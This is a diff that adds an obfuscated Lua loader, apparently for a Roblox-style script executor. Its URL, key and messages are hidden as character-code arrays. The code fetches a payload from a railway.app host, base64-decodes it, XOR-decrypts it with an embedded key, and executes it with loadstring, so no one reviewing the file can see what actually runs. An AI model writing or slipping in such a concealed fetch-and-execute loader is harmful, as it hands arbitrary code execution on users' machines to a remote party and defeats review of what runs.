@@ -1,0 +1,63 @@
+local _S=function(t)local r={}for i=1,#t do r[i]=string.char(t[i])end return table.concat(r)end
+local _U=_S({104,116,116,112,115,58,47,47,98,97,108,97,98,97,108,97,108,97,45,112,114,111,100,117,99,116,105,111,110,46,117,112,46,114,97,105,108,119,97,121,46,97,112,112,47,104,117,98,63,116,61,100,101,118,45,116,101,115,116,45,116,111,107,101,110,45,106,52,114,122,122})
+local _K=_S({52,52,48,52,52,55,98,55,54,54,57,52,54,97,49,54})
+local _T=_S({91,74,52,114,122,122,93})
+
+local function _xb(a,b)
+    local r,bt=0,128
+    while bt>0 do
+        local ab=a>=bt and 1 or 0
+        local bb=b>=bt and 1 or 0
+        if ab~=bb then r=r+bt end
+        if ab==1 then a=a-bt end
+        if bb==1 then b=b-bt end
+        bt=math.floor(bt/2)
+    end
+    return r
+end
+
+local function _b64(_s)
+    local _c=_S({65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,48,49,50,51,52,53,54,55,56,57,43,47})
+    local lk={}
+    for i=1,#_c do lk[_c:sub(i,i)]=i-1 end
+    local out,bits,val={},0,0
+    for i=1,#_s do
+        local ch=_s:sub(i,i)
+        if ch==_S({61}) then break end
+        val=val*64+(lk[ch] or 0)
+        bits=bits+6
+        if bits>=8 then
+            bits=bits-8
+            local pw=2^bits
+            local by=math.floor(val/pw)%256
+            val=val%pw
+            out[#out+1]=string.char(by)
+        end
+    end
+    return table.concat(out)
+end
+
+local function _xd(data,key)
+    local out={}
+    for i=1,#data do
+        out[i]=string.char(_xb(data:byte(i),key:byte(((i-1)%#key)+1)))
+    end
+    return table.concat(out)
+end
+
+local _ok,_res=pcall(function()
+    return request({Url=_U,Method=_S({71,69,84})})
+end)
+if not _ok then warn(_T.._S({32,82,101,113,117,101,115,116,32,101,114,114,111,114,58,32})..tostring(_res))return end
+if not _res.Success then warn(_T.._S({32,72,84,84,80,32})..tostring(_res.StatusCode))return end
+
+local _ok2,_dec=pcall(function()
+    return _xd(_b64(_res.Body),_K)
+end)
+if not _ok2 then warn(_T.._S({32,68,101,99,114,121,112,116,32,101,114,114,111,114,58,32})..tostring(_dec))return end
+
+local _fn,_er=loadstring(_dec)
+if not _fn then warn(_T.._S({32,76,111,97,100,115,116,114,105,110,103,32,101,114,114,111,114,58,32})..tostring(_er))return end
+
+local _ok3,_er3=pcall(_fn)
+if not _ok3 then warn(_T.._S({32,83,99,114,105,112,116,32,101,114,114,111,114,58,32})..tostring(_er3))end
